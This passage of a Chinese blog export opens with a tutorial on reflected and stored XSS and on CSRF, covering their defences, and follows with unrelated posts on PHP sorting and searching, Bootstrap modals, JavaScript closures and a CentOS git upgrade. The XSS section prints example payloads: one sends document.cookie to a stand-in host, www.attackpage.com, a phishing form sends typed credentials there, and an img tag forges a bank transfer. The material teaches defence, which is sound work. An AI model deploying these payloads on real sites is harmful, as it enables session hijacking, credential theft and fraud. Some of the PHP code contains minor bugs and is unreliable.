<p>当受害者点击这个链接的时候，注入的脚本被当作搜索的关键词发送到目标服务器的search.asp页面中，则在搜索结果的返回页面中，这段脚本将被当作搜索的关键词而嵌入。这样，当用户得到搜索结果页面后，这段脚本也得到了执行。这就是反射型XSS攻击的原理，可以看到，攻击者巧妙地通过反射型XSS的攻击方式，达到了在受害者的浏览器上执行脚本的目的。由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用，这也是它被称为非持久型XSS的原因 2.存储型XSS 存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器的数据库和文件中。这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。 Xss危害 1.盗取cookie 通过XSS攻击，由于注入代码是在受害者的浏览器上执行，因此能够很方便地窃取到受害者的Cookie信息。比如，我们只要注入类似如下的代码：</p>
<script>location.replace("http://www.attackpage.com/record.asp?secret="+document.cookie)</script>

<p>当受害者的浏览器执行这段脚本的时候，就会自动访问攻击者建立的网站<a href="http://www.attackpage.com,打开其中的recourd.asp,将受害者浏览器的cookie信息给记录下来.这样,攻击者就得到了用户的cookie信息./">www.attackpage.com，打开其中的recourd.asp，将受害者浏览器的Cookie信息给记录下来。这样，攻击者就得到了用户的Cookie信息。</a> 得到受害者的Cookie信息后，攻击者可以很方便地冒充受害者，从而拥有其在目标服务器上的所有权限，相当于受害者的身份认证被窃取了。 2.钓鱼攻击 所谓钓鱼攻击就是构建一个钓鱼页面，诱骗受害者在其中输入一些敏感信息，然后将其发送给攻击者。利用XSS的注入脚本，我们也可以很方便地注入钓鱼页面的代码，从而引导钓鱼攻击。比如下面这样一段代码：</p>
<script>

　　function hack(){ 
　　　　location.replace("http://www.attackpage.com/record.asp?username="+document.forms\[0\].user.value + "password=" + document.forms\[0\].pass.value);
　　}

　　</script>
<p>　　<form><br>　　<br> <H3>此功能需要登录:</H3 ><br>　　<br><br>请输入用户名：<br><br>　　&lt;input type=”text” id=”user”name=”user”&gt;<br>　　<br>请输入密码：<br><br>　　<input type=”password” name =“pass”><br>　　<br>&lt;input type=”submit”name=”login” value=”登录”onclick=”hack()”&gt;<br>　　</form></p>
<p>注入上面的代码后，则会在原来的页面上，插入一段表单，要求用户输入自己的用户名和密码，而当用户点击“登录”按钮后，则会执行hack()函数，将用户的输入发送到攻击者指定的网站上去。这样，攻击者就成功窃取了该用户的账号信息。和一般的钓鱼攻击不同，XSS引导的钓鱼攻击由于是对用户信任的网站页面进行修改的。 3. CSRF攻击 比如我们注入如下的HTML代码： &lt;imgsrc = “<a href="http://www.bank.com/transfer.do?toAct=123456&amp;money=10000&gt;">http://www.bank.com/transfer.do?toAct=123456&amp;money=10000&gt;</a> 假如上面的代码中所访问的是某个银行网站的转账服务，则当受害者的浏览器运行这段脚本时，就会向攻击者指定的账户（示例的123456）执行转账操作。由于这个转账请求是在受害者的浏览器中运行的，因此浏览器也会自动将受害者的Cookie信息一并发送。这样，发送的请求就好像是受害者自己发送的一样，银行网站也将认可这个请求的合法性，攻击者也就达到了伪造请求的目的。 4.传播恶意软件 除了直接注入恶意脚本以外，通过XSS攻击，攻击者也可以很方便地在脚本中引入一些恶意软件，比如病毒、木马、蠕虫等等。例如，攻击者可以在某个自己建立的页面上放置一些恶意软件，然后用XSS注入的方式，插入一段引用该页面的脚本。这样当受害者的浏览器执行这段脚本的时候，就会自动访问放置了恶意软件的页面，从而受到这些恶意软件的感染。 XSS的预防 1. 输入过滤 对用户的所有输入数据进行检测，比如过滤其中的“&lt;”、“&gt;”、“/”等可能导致脚本注入的特殊字符，或者过滤“script”、“javascript”等脚本关键字，或者对输入数据的长度进行限制等等。同时，我们也要考虑用户可能绕开ASCII码，使用十六进制编码来输入脚本。因此，对用户输入的十六进制编码，我们也要进行相应的过滤。只要能够严格检测每一处交互点，保证对所有用户可能的输入都进行检测和XSS过滤，就能够有效地阻止XSS攻击。 2. 输出编码 通过前面对XSS攻击的分析，我们可以看到，之所以会产生XSS攻击，就是因为Web应用程序将用户的输入直接嵌入到某个页面当中，作为该页面的HTML代码的一部分。因此，当Web应用程序将用户的输入数据输出到目标页面中时，只要用HtmlEncoder等工具先对这些数据进行编码，然后再输出到目标页面中。这样，如果用户输入一些HTML的脚本，也会被当成普通的文字，而不会成为目标页面HTML代码的一部分得到执行。 3. Cookie防盗 利用XSS攻击，攻击者可以很方便地窃取到合法用户的Cookie信息。因此，对于Cookie，我们可以采取以下的措施。首先，我们要尽可能地避免在Cookie中泄露隐私，如用户名、密码等；其次，我们可以将Cookie信息利用MD5等Hash算法进行多次散列后存放；再次，为了防止重放攻击，我们也可以将Cookie和IP进行绑定，这样也可以阻止攻击者冒充正常用户的身份。 作为一名普通的网络用户，在XSS攻击的预防上我们可以采取以下措施。首先，我们不要轻易相信电子邮件或者网页中的不明链接，这些链接很有可能引导反射型XSS攻击或者使我们访问到一些不安全的网页。其次，我们在不必要的时候可以禁用脚本功能，这样XSS注入的脚本就无法得到运行。 <strong>3. CSRF 攻击</strong> CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。 你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 CSRF漏洞现状 CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型BLOG网站），YouTube和百度HI……而现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”。 原理 网站A ：为恶意网站。 网站B ：用户已登录的网站。 当用户访问 A站 时，A站 私自访问 B站 的操作链接，模拟用户操作。 假设B站有一个删除评论的链接：<a href="http://b.com/comment/?type=delete&amp;id=81723">http://b.com/comment/?type=delete&amp;id=81723</a> A站 直接访问该链接，就能删除用户在 B站 的评论。 CSRF 防御技巧 1.验证码 几乎所有人都知道验证码，但验证码不单单用来防止注册机的暴力破解，还可以有效防止CSRF的攻击。验证码算是对抗CSRF攻击最简洁有效的方法。但使用验证码的问题在于，不可能在用户的所有操作上都需要输入验证码.只有一些关键的操作，才能要求输入验证码。不过随着HTML5的发展。利用canvas标签，前端也能识别验证码的字符，让CSRF生效。 2.Token CSRF能攻击成功，根本原因是：操作所带的参数均被攻击者猜测到。既然知道根本原因，我们就对症下药，利用Token。当向服务器传参数时，带上Token。这个Token是一个随机值，并且由服务器和用户同时持有。当用户提交表单时带上Token值，服务器就能验证表单和session中的Token是否一致。 token生成示例代码如下  </p>
<p>private static SecureRandom secureRandom=null;<br>public static String createToken() {<br>if(secureRandom==null){<br>String entoropy=”LogonSessionEntoropy” + System.currentTimeMillis();<br>try {<br>secureRandom = SecureRandom.getInstance(“SHA1PRNG”);<br>} catch (NoSuchAlgorithmException e) {<br>throw new RuntimeException(e);<br>}<br>secureRandom.setSeed(entoropy.getBytes());<br>}<br>byte bytes[]=new byte[16];<br>secureRandom.nextBytes(bytes);<br>byte[] base64Bytes = Base64.encode(bytes);<br>return new String(base64Bytes);<br>}</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>综合</category>
      </categories>
      <tags>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构之四种基本排序</title>
    <url>/2016/01/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E5%9B%9B%E7%A7%8D%E5%9F%BA%E6%9C%AC%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<blockquote>
<p>算法是程序的核心，算法的好坏决定了程序的质量。</p>
</blockquote>
<p>排序算法是程序开发的基本知识。这里介绍冒泡排序，插入排序，选择排序，快速排序四种基本算法，分析一下算法的思路。<br><strong>前提：</strong> 分别用冒泡排序法，快速排序法，选择排序法，插入排序法将下面数组中的值按照从小到大的顺序进行排序。 $arr(1,43,54,62,21,66,32,78,36,76,39);</p>
<h2 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1. 冒泡排序"></a>1. 冒泡排序</h2><p><strong>思路分析：</strong></p>
<p>在要排序的一组数中，对当前还未排好的序列，从前往后对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即，每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$arr&#x3D;array(1,43,54,62,21,66,32,78,36,76,39);  </span><br><span class="line">function bubbleSort($arr)</span><br><span class="line">&#123;  </span><br><span class="line">  $len&#x3D;count($arr);</span><br><span class="line">  &#x2F;&#x2F;该层循环控制 需要冒泡的轮数</span><br><span class="line">  for($i&#x3D;1;$i&lt;$len;$i++)</span><br><span class="line">  &#123; &#x2F;&#x2F;该层循环用来控制每轮 冒出一个数 需要比较的次数</span><br><span class="line">    for($k&#x3D;0;$k&lt;$len-$i;$k++)</span><br><span class="line">    &#123;</span><br><span class="line">       if($arr[$k]&gt;$arr[$k+1])</span><br><span class="line">        &#123;</span><br><span class="line">            $tmp&#x3D;$arr[$k+1];</span><br><span class="line">            $arr[$k+1]&#x3D;$arr[$k];</span><br><span class="line">            $arr[$k]&#x3D;$tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return $arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="2. 选择排序"></a>2. 选择排序</h2><p><strong>思路分析：</strong><br>在要排序的一组数中，选出最小的一个数与第一个位置的数交换。然后在剩下的数当中再找最小的与第二个位置的数交换，如此循环到倒数第二个数和最后一个数比较为止。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function selectSort($arr) &#123;</span><br><span class="line">&#x2F;&#x2F;双重循环完成，外层控制轮数，内层控制比较次数</span><br><span class="line"> $len&#x3D;count($arr);</span><br><span class="line">    for($i&#x3D;0; $i&lt;$len-1; $i++) &#123;</span><br><span class="line">        &#x2F;&#x2F;先假设最小的值的位置</span><br><span class="line">        $p &#x3D; $i;</span><br><span class="line">        </span><br><span class="line">        for($j&#x3D;$i+1; $j&lt;$len; $j++) &#123;</span><br><span class="line">            &#x2F;&#x2F;$arr[$p] 是当前已知的最小值</span><br><span class="line">            if($arr[$p] &gt; $arr[$j]) &#123;</span><br><span class="line">            &#x2F;&#x2F;比较，发现更小的,记录下最小值的位置；并且在下次比较时采用已知的最小值进行比较。</span><br><span class="line">                $p &#x3D; $j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F;已经确定了当前的最小值的位置，保存到$p中。如果发现最小值的位置与当前假设的位置$i不同，则位置互换即可。</span><br><span class="line">        if($p !&#x3D; $i) &#123;</span><br><span class="line">            $tmp &#x3D; $arr[$p];</span><br><span class="line">            $arr[$p] &#x3D; $arr[$i];</span><br><span class="line">            $arr[$i] &#x3D; $tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;返回最终结果</span><br><span class="line">    return $arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3.插入排序"></a>3.插入排序</h2><p><strong>思路分析：</strong><br>在要排序的一组数中，假设前面的数已经是排好顺序的，现在要把第n个数插到前面的有序数中，使得这n个数也是排好顺序的。如此反复循环，直到全部排好顺序。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function insertSort($arr) &#123;</span><br><span class="line">    $len&#x3D;count($arr); </span><br><span class="line">    for($i&#x3D;1, $i&lt;$len; $i++) &#123;</span><br><span class="line">        $tmp &#x3D; $arr[$i];</span><br><span class="line">        &#x2F;&#x2F;内层循环控制，比较并插入</span><br><span class="line">        for($j&#x3D;$i-1;$j&gt;&#x3D;0;$j--) &#123;</span><br><span class="line">            if($tmp &lt; $arr[$j]) &#123;</span><br><span class="line">                &#x2F;&#x2F;发现插入的元素要小，交换位置，将后边的元素与前面的元素互换</span><br><span class="line">                $arr[$j+1] &#x3D; $arr[$j];</span><br><span class="line">                $arr[$j] &#x3D; $tmp;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                &#x2F;&#x2F;如果碰到不需要移动的元素，由于是已经排序好是数组，则前面的就不需要再次比较了。</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> </p>
<h2 id="4-快速排序"><a href="#4-快速排序" class="headerlink" title="4.快速排序"></a>4.快速排序</h2><p><strong>思路分析：</strong></p>
<p>选择一个基准元素，通常选择第一个元素或者最后一个元素。通过一趟扫描，将待排序列分成两部分，一部分比基准元素小，一部分大于等于基准元素。此时基准元素在其排好序后的正确位置，然后再用同样的方法递归地排序划分的两部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function quickSort($arr) &#123;</span><br><span class="line">    &#x2F;&#x2F;先判断是否需要继续进行</span><br><span class="line">    $length &#x3D; count($arr);</span><br><span class="line">    if($length &lt;&#x3D; 1) &#123;</span><br><span class="line">        return $arr;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;选择第一个元素作为基准</span><br><span class="line">    $base_num &#x3D; $arr[0];</span><br><span class="line">    &#x2F;&#x2F;遍历除了标尺外的所有元素，按照大小关系放入两个数组内</span><br><span class="line">    &#x2F;&#x2F;初始化两个数组</span><br><span class="line">    $left_array &#x3D; array();  &#x2F;&#x2F;小于基准的</span><br><span class="line">    $right_array &#x3D; array();  &#x2F;&#x2F;大于基准的</span><br><span class="line">    for($i&#x3D;1; $i&lt;$length; $i++) &#123;</span><br><span class="line">        if($base_num &gt; $arr[$i]) &#123;</span><br><span class="line">            &#x2F;&#x2F;放入左边数组</span><br><span class="line">            $left_array[] &#x3D; $arr[$i];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F;放入右边</span><br><span class="line">            $right_array[] &#x3D; $arr[$i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;再分别对左边和右边的数组进行相同的排序处理方式递归调用这个函数</span><br><span class="line">    $left_array &#x3D; quick_sort($left_array);</span><br><span class="line">    $right_array &#x3D; quick_sort($right_array);</span><br><span class="line">    &#x2F;&#x2F;合并</span><br><span class="line">    return array_merge($left_array, array($base_num), $right_array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>bootstrap modal 弹窗 数据清除</title>
    <url>/2015/09/13/bootstrap-modal-%E5%BC%B9%E7%AA%97-%E6%95%B0%E6%8D%AE%E6%B8%85%E9%99%A4/</url>
    <content><![CDATA[<p>bootstrap modal操作简单易用， 但是发现当用于弹出不同的编辑页面时，数据总是显示第一次的数据， 查了好久是这样的：</p>
<p>//清除弹窗原数据<br>$(“#create_modal”).on(“hidden.bs.modal”, <strong>function</strong>() {<br>    $(<strong>this</strong>).removeData(“bs.modal”);<br>});</p>
<p><strong>另附上modal一些触发函数</strong> 事件描述实例show.bs.modal在调用 show 方法后触发。</p>
<p>$(‘#identifier’).on(‘show.bs.modal’, function () {<br>  // 执行一些动作…<br>})</p>
<p>shown.bs.modal当模态框对用户可见时触发（将等待 CSS 过渡效果完成）。</p>
<p>$(‘#identifier’).on(‘shown.bs.modal’, function () {<br>  // 执行一些动作…<br>})</p>
<p>hide.bs.modal当调用 hide 实例方法时触发。</p>
<p>$(‘#identifier’).on(‘hide.bs.modal’, function () {<br>  // 执行一些动作…<br>})</p>
<p>hidden.bs.modal当模态框完全对用户隐藏时触发。</p>
<p>$(‘#identifier’).on(‘hidden.bs.modal’, function () {<br>  // 执行一些动作…<br>})</p>
]]></content>
      <categories>
        <category>JAVAScript</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>二分法查找与顺序查找</title>
    <url>/2015/08/15/%E4%BA%8C%E5%88%86%E6%B3%95%E6%9F%A5%E6%89%BE%E4%B8%8E%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<p>面试过成功京城会遇到算法题，而经常问到直接或间接的的就有查找，本文主要介绍二分法顺查</p>
<p><strong>一、顺序查找</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">&#x2F;&#x2F;顺序查找数组中某个数  </span><br><span class="line">&#x2F;&#x2F;如从一个数组中找到一个数：34  </span><br><span class="line">&#x2F;&#x2F;$arr &#x3D; array(23,45,67,34,9,34,6)如果查到则输出下标，否则输出查无此数  </span><br><span class="line"></span><br><span class="line">$arr &#x3D; array(23,45,67,34,9,34,6);  </span><br><span class="line">&#x2F;&#x2F;设一个标志位  </span><br><span class="line">$flag &#x3D; false;  </span><br><span class="line">foreach($arr as $x &#x3D;&gt; $x_val)  </span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    if ($x_val &#x3D;&#x3D; 34)  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &#39;arr\[&#39;.$x.&#39;\]&#x3D;34&#39;.&quot;&lt;br&gt;&quot;;  </span><br><span class="line">        $flag &#x3D; true;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">if ($flag&#x3D;&#x3D;false)  </span><br><span class="line">&#123;  </span><br><span class="line">    echo &quot;查无此数！&quot;;  </span><br><span class="line">&#125;     </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>简单明了 ，但当数据量过大时可能会耗费时间空间等等，所以就有了二分法的概念</p>
<p> <strong>二、二分法</strong></p>
<p> 首先找到数组中间这个数，然后与要查找的数比较，如果要查找的数大于中间这个数，则说明应该向后找，否则向前找，如果想等，则说明找到。</p>
<p> <strong>前提：</strong>该数组必须是有序数列，如果该数组无序，必须先排序后查找</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php    </span><br><span class="line">&#x2F;&#x2F;二分查找数组中某个数  </span><br><span class="line">&#x2F;&#x2F;如从一个数组中找到一个数：134  </span><br><span class="line">&#x2F;&#x2F;$arr &#x3D; array(23,45,67,89,90,134,236)如果查到则输出下标，否则输出查无此数  </span><br><span class="line"></span><br><span class="line">function binarySearch(&amp;$arr,$val,$leftindex,$rightindex)  </span><br><span class="line">&#123;  </span><br><span class="line">    if($rightindex &lt; $leftindex)  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &quot;查无此数！&quot;;  </span><br><span class="line">        return 0;  </span><br><span class="line">    &#125;  </span><br><span class="line">    &#x2F;&#x2F;四舍五入取整数值  </span><br><span class="line">    $middleindex &#x3D; round(($leftindex + $rightindex)&#x2F;2);  </span><br><span class="line">    if($val &gt; $arr\[$middleindex\])  </span><br><span class="line">    &#123;  </span><br><span class="line">        binarySearch($arr,$val,$middleindex + 1,$rightindex);  </span><br><span class="line">    &#125;  </span><br><span class="line">    elseif($val &lt; $arr\[$middleindex\])  </span><br><span class="line">    &#123;  </span><br><span class="line">        binarySearch($arr,$val,$leftindex,$middleindex - 1);  </span><br><span class="line">    &#125;  </span><br><span class="line">    else  </span><br><span class="line">    &#123;  </span><br><span class="line">        echo &#39;arr\[&#39;.&quot;$middleindex&quot;.&#39;\]&#x3D;134&#39;.&quot;&lt;br&gt;&quot;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">    $arr &#x3D; array(23,45,67,89,90,134,236);  </span><br><span class="line">    sort（$arr）;&#x2F;&#x2F;先排序</span><br><span class="line">&#x2F;&#x2F;  $leftindex &#x3D; 0;左下标  </span><br><span class="line">&#x2F;&#x2F;  $rightindex &#x3D; count($arr)-1;右下标  </span><br><span class="line">&#x2F;&#x2F;      $val &#x3D; 134;要找的值  </span><br><span class="line">    binarySearch($arr,134,0,count($arr) - 1)  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>此处应用了递归，但是快速定位，大大提高效率！</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>程序设计</tag>
      </tags>
  </entry>
  <entry>
    <title>JS之闭包</title>
    <url>/2015/02/19/js%E4%B9%8B%E9%97%AD%E5%8C%85/</url>
    <content><![CDATA[<p>闭包（closure）是Javascript语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。 下面就是我的学习笔记，对于Javascript初学者应该是很有用的。 <strong>一、变量的作用域</strong> 要理解闭包，首先必须理解Javascript特殊的变量作用域。 变量的作用域无非就是两种：全局变量和局部变量。 Javascript语言的特殊之处，就在于函数内部可以直接读取全局变量。</p>
<p>var n=999;<br>　　function f1(){<br>　　　　alert(n);<br>　　}<br>　　f1(); // 999</p>
<p>另一方面，在函数外部自然无法读取函数内的局部变量。</p>
<p>function f1(){<br>　　　　var n=999;<br>　　}<br>　　alert(n); // error</p>
<p>  这里有一个地方需要注意，函数内部声明变量的时候，一定要使用var命令。如果不用的话，你实际上声明了一个全局变量！</p>
<p>function f1(){<br>　　　　n=999;<br>　　}<br>　　f1();<br>　　alert(n); // 999</p>
<p>  <strong>二、如何从外部读取局部变量？</strong> 出于种种原因，我们有时候需要得到函数内的局部变量。但是，前面已经说过了，正常情况下，这是办不到的，只有通过变通方法才能实现。 那就是在函数的内部，再定义一个函数。</p>
<p>function f1(){<br>　　　　var n=999;<br>　　　　function f2(){<br>　　　　　　alert(n); // 999<br>　　　　}<br>　　}</p>
<p>在上面的代码中，函数f2就被包括在函数f1内部，这时f1内部的所有局部变量，对f2都是可见的。但是反过来就不行，f2内部的局部变量，对f1就是不可见的。这就是Javascript语言特有的”链式作用域”结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。 既然f2可以读取f1中的局部变量，那么只要把f2作为返回值，我们不就可以在f1外部读取它的内部变量了吗！</p>
<p>function f1(){<br>　　　　var n=999;<br>　　　　function f2(){<br>　　　　　　alert(n);<br>　　　　}<br>　　　　return f2;<br>　　}<br>　　var result=f1();<br>　　result(); // 999</p>
<p><strong>三、闭包的概念</strong> 上一节代码中的f2函数，就是闭包。 各种专业文献上的”闭包”（closure）定义非常抽象，很难看懂。我的理解是，闭包就是能够读取其他函数内部变量的函数。 由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成”定义在一个函数内部的函数”。 所以，在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。 <strong>四、闭包的用途</strong> 闭包可以用在许多地方。它的最大用处有两个，一个是前面提到的可以读取函数内部的变量，另一个就是让这些变量的值始终保持在内存中。 怎么来理解这句话呢？请看下面的代码。</p>
<p>function f1(){<br>　　　　var n=999;<br>　　　　nAdd=function(){n+=1}<br>　　　　function f2(){<br>　　　　　　alert(n);<br>　　　　}<br>　　　　return f2;<br>　　}<br>　　var result=f1();<br>　　result(); // 999<br>　　nAdd();<br>　　result(); // 1000</p>
<p>在这段代码中，result实际上就是闭包f2函数。它一共运行了两次，第一次的值是999，第二次的值是1000。这证明了，函数f1中的局部变量n一直保存在内存中，并没有在f1调用后被自动清除。 为什么会这样呢？原因就在于f1是f2的父函数，而f2被赋给了一个全局变量，这导致f2始终在内存中，而f2的存在依赖于f1，因此f1也始终在内存中，不会在调用结束后，被垃圾回收机制（garbage collection）回收。 这段代码中另一个值得注意的地方，就是”nAdd=function(){n+=1}”这一行，首先在nAdd前面没有使用var关键字，因此nAdd是一个全局变量，而不是局部变量。其次，nAdd的值是一个匿名函数（anonymous function），而这个匿名函数本身也是一个闭包，所以nAdd相当于是一个setter，可以在函数外部对函数内部的局部变量进行操作。 <strong>五、使用闭包的注意点</strong> 1）由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露。解决方法是，在退出函数之前，将不使用的局部变量全部删除。 2）闭包会在父函数外部，改变父函数内部变量的值。所以，如果你把父函数当作对象（object）使用，把闭包当作它的公用方法（Public Method），把内部变量当作它的私有属性（private value），这时一定要小心，不要随便改变父函数内部变量的值。 <strong>六、思考题</strong> 如果你能理解下面两段代码的运行结果，应该就算理解闭包的运行机制了。</p>
<p>代码片段一。<br>　　var name = “The Window”;<br>　　var object = {<br>　　　　name : “My Object”,<br>　　　　getNameFunc : function(){<br>　　　　　　return function(){<br>　　　　　　　　return this.name;<br>　　　　　　};<br>　　　　}<br>　　};<br>　　alert(object.getNameFunc()());</p>
<p>代码片段二。<br>　　var name = “The Window”;<br>　　var object = {<br>　　　　name : “My Object”,<br>　　　　getNameFunc : function(){<br>　　　　　　var that = this;<br>　　　　　　return function(){<br>　　　　　　　　return that.name;<br>　　　　　　};<br>　　　　}<br>　　};<br>　　alert(object.getNameFunc()());</p>
]]></content>
      <categories>
        <category>JAVAScript</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>内存溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos系统git1.7升级</title>
    <url>/2015/02/15/centos%E7%B3%BB%E7%BB%9Fgit1-7%E5%8D%87%E7%BA%A7/</url>
    <content><![CDATA[<p>应用centos系统时，总有git报错，版本过低不能操作巴拉巴拉。。。</p>
<h3 id="安装需求："><a href="#安装需求：" class="headerlink" title="安装需求："></a>安装需求：</h3><blockquote>
<h1 id="yum-install-curl-devel-expat-devel-gettext-devel-openssl-devel-zlib-devel-asciidoc"><a href="#yum-install-curl-devel-expat-devel-gettext-devel-openssl-devel-zlib-devel-asciidoc" class="headerlink" title="yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc"></a>yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</h1><h1 id="yum-install-gcc-perl-ExtUtils-MakeMaker"><a href="#yum-install-gcc-perl-ExtUtils-MakeMaker" class="headerlink" title="yum install  gcc perl-ExtUtils-MakeMaker"></a>yum install  gcc perl-ExtUtils-MakeMaker</h1></blockquote>
<p>error: ```/utf8.c:463: undefined reference to `libiconv’```</p>
<blockquote>
<h1 id="wget-http-ftp-gnu-org-pub-gnu-libiconv-libiconv-1-14-tar-gz"><a href="#wget-http-ftp-gnu-org-pub-gnu-libiconv-libiconv-1-14-tar-gz" class="headerlink" title="wget http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.14.tar.gz"></a>wget <a href="http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.14.tar.gz">http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.14.tar.gz</a></h1><h1 id="tar-zxvf-libiconv-1-14-tar-gz"><a href="#tar-zxvf-libiconv-1-14-tar-gz" class="headerlink" title="tar zxvf libiconv-1.14.tar.gz"></a>tar zxvf libiconv-1.14.tar.gz</h1><h1 id="cd-libiconv-1-14"><a href="#cd-libiconv-1-14" class="headerlink" title="cd libiconv-1.14"></a>cd libiconv-1.14</h1><h1 id="configure-–prefix-usr-local-libiconv"><a href="#configure-–prefix-usr-local-libiconv" class="headerlink" title="./configure –prefix=/usr/local/libiconv"></a>./configure –prefix=/usr/local/libiconv</h1><h1 id="make-amp-amp-make-install"><a href="#make-amp-amp-make-install" class="headerlink" title="make &amp;&amp; make install"></a>make &amp;&amp; make install</h1></blockquote>
<h3 id="卸载centos自带的git1-7"><a href="#卸载centos自带的git1-7" class="headerlink" title="卸载centos自带的git1.7:"></a>卸载centos自带的git1.7:</h3><p>通过git –version查看系统带的版本，Cento6.5应该自带的是git版本是1.7.1</p>
<blockquote>
<h1 id="yum-remove-git"><a href="#yum-remove-git" class="headerlink" title="yum remove git"></a>yum remove git</h1></blockquote>
<p> </p>
<h3 id="下载git2-2-1并将git添加到环境变量中（版本自选-https-github-com-git-git-releases）"><a href="#下载git2-2-1并将git添加到环境变量中（版本自选-https-github-com-git-git-releases）" class="headerlink" title="下载git2.2.1并将git添加到环境变量中（版本自选 https://github.com/git/git/releases）"></a>下载git2.2.1并将git添加到环境变量中（版本自选 <a href="https://github.com/git/git/releases">https://github.com/git/git/releases</a>）</h3><blockquote>
<h1 id="wget-https-github-com-git-git-archive-v2-2-1-tar-gz"><a href="#wget-https-github-com-git-git-archive-v2-2-1-tar-gz" class="headerlink" title="wget https://github.com/git/git/archive/v2.2.1.tar.gz"></a>wget <a href="https://github.com/git/git/archive/v2.2.1.tar.gz">https://github.com/git/git/archive/v2.2.1.tar.gz</a></h1><h1 id="tar-zxvf-v2-2-1-tar-gz"><a href="#tar-zxvf-v2-2-1-tar-gz" class="headerlink" title="tar zxvf v2.2.1.tar.gz"></a>tar zxvf v2.2.1.tar.gz</h1><h1 id="cd-git-2-2-1"><a href="#cd-git-2-2-1" class="headerlink" title="cd git-2.2.1"></a>cd git-2.2.1</h1><h1 id="make-configure"><a href="#make-configure" class="headerlink" title="make configure"></a>make configure</h1><h1 id="configure-–prefix-usr-local-git-–with-iconv-usr-local-libiconv"><a href="#configure-–prefix-usr-local-git-–with-iconv-usr-local-libiconv" class="headerlink" title="./configure –prefix=/usr/local/git –with-iconv=/usr/local/libiconv"></a>./configure –prefix=/usr/local/git 